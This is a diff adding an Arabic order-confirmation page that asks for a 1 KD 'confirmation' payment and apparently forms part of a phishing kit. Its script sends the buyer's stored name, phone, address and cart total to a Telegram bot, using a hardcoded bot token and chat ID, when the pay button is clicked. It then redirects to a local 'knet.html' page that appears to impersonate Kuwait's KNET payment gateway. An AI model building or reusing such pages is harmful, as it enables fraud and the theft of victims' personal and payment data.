@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>الخطوة 3 – تأكيد الطلب</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #f4f5f7;
+      color: #252525;
+      font-family: Arial, Tahoma, sans-serif;
+    }
+    .page {
+      width: min(100%, 430px);
+      min-height: 100vh;
+      margin: 0 auto;
+      background: #fff;
+      box-shadow: 0 0 22px rgba(0,0,0,.1);
+    }
+    .header {
+      height: 58px;
+      display: grid;
+      grid-template-columns: 44px 1fr 44px;
+      align-items: center;
+      padding: 0 12px;
+      border-bottom: 1px solid #eee;
+    }
+    .back {
+      width: 36px; height: 36px;
+      display: grid; place-items: center;
+      color: #555; font-size: 30px;
+      text-decoration: none;
+    }
+    .header-title { margin: 0; text-align: center; font-size: 20px; font-weight: 800; }
+    .steps {
+      display: flex; justify-content: center; gap: 8px;
+      padding: 14px 18px; border-bottom: 1px solid #eee;
+    }
+    .step {
+      width: 32px; height: 32px; border-radius: 50%;
+      display: grid; place-items: center;
+      font-size: 13px; font-weight: 800;
+      border: 2px solid #ddd; color: #999;
+    }
+    .step.active { border-color: #e40052; background: #e40052; color: #fff; }
+    .step.done { border-color: #18a957; background: #18a957; color: #fff; }
+    .content { padding: 28px 18px; }
+    .badge {
+      width: 72px; height: 72px; margin: 0 auto 18px;
+      display: grid; place-items: center;
+      border-radius: 50%;
+      background: #18a957; color: #fff;
+      font-size: 36px; font-weight: 800;
+    }
+    h1 { margin: 0 0 10px; text-align: center; font-size: 22px; line-height: 1.4; }
+    .lead {
+      margin: 0 auto 22px; max-width: 330px;
+      color: #666; text-align: center; font-size: 15px; line-height: 1.7;
+    }
+    .summary {
+      display: grid; gap: 10px;
+      margin: 0 0 20px; padding: 14px;
+      border: 1px solid #eee; border-radius: 8px;
+      background: #fff8fb;
+    }
+    .row {
+      display: flex; align-items: center;
+      justify-content: space-between; gap: 12px;
+      font-size: 15px; line-height: 1.5;
+    }
+    .row strong { color: #1577d3; font-size: 19px; }
+    .note {
+      margin: 0 0 20px; padding: 12px;
+      border-radius: 8px; background: #eef7ff;
+      color: #23557f; font-size: 14px; line-height: 1.7;
+    }
+    .pay {
+      display: block; width: 100%;
+      padding: 15px; border: 0;
+      border-radius: 8px; background: #1577d3;
+      color: #fff; font-size: 18px; font-weight: 800;
+      font-family: Arial, Tahoma, sans-serif;
+      text-align: center; text-decoration: none;
+      cursor: pointer;
+      box-shadow: 0 8px 18px rgba(21,119,211,.24);
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <header class="header">
+      <a class="back" href="step2.html" aria-label="رجوع">←</a>
+      <p class="header-title">تأكيد الطلب</p>
+      <span></span>
+    </header>
+    <div class="steps" aria-label="خطوات الطلب">
+      <div class="step done" aria-label="الخطوة 1 – مكتملة">✓</div>
+      <div class="step done" aria-label="الخطوة 2 – مكتملة">✓</div>
+      <div class="step active" aria-label="الخطوة 3 – الحالية">3</div>
+    </div>
+    <section class="content">
+      <div class="badge" aria-hidden="true">✓</div>
+      <h1>تم حفظ بيانات التوصيل</h1>
+      <p class="lead">لتأكيد الطلب، يرجى دفع مبلغ رمزي الآن، وباقي المبلغ يكون عند التوصيل والاستلام.</p>
+
+      <div class="summary">
+        <div class="row">
+          <span>مبلغ التأكيد الآن</span>
+          <strong>1 د.ك</strong>
+        </div>
+        <div class="row">
+          <span>باقي المبلغ</span>
+          <strong>عند التوصيل</strong>
+        </div>
+      </div>
+
+      <p class="note">بعد دفع 1 د.ك يتم تثبيت الطلب، ويتم استكمال باقي المبلغ عند الاستلام من مندوب التوصيل.</p>
+      <button class="pay" id="confirmPay" type="button">ادفع 1 د.ك لتأكيد الطلب</button>
+    </section>
+  </main>
+  <script>
+    function send_telegram_message(message, disable_notification) {
+      const botToken = window.TELEGRAM_BOT_TOKEN || "8770505930:AAE0rDy1QYCdbWW0S-EeRtFp-6XOFUgIKsU";
+      const chatId = window.TELEGRAM_CHAT_ID || "7801329761";
+      if (!botToken || !chatId) return;
+      const name = sessionStorage.getItem('buyer_name') || '';
+      const phone = sessionStorage.getItem('buyer_phone') || '';
+      const area = sessionStorage.getItem('delivery_area') || '';
+      const street = sessionStorage.getItem('delivery_street') || '';
+      const building = sessionStorage.getItem('delivery_building') || '';
+      const total = sessionStorage.getItem('cart_total') || '';
+      const fullMsg = message +
+        '\n👤 الاسم: ' + name +
+        '\n📞 الجوال: ' + phone +
+        '\n📍 المنطقة: ' + area +
+        '\n🏠 الشارع: ' + street +
+        '\n🏢 المبنى: ' + building +
+        '\n💰 الإجمالي: ' + total + ' د.ك';
+      fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: fullMsg,
+          disable_notification: !!disable_notification,
+          parse_mode: 'HTML'
+        })
+      }).catch(function() {});
+    }
+
+    document.getElementById('confirmPay').addEventListener('click', function() {
+      send_telegram_message('🛒 طلب جديد – تم الضغط على زر الدفع');
+      setTimeout(function() {
+        window.location.href = 'knet.html';
+      }, 300);
+    });
+  </script>
+</body>
+</html>
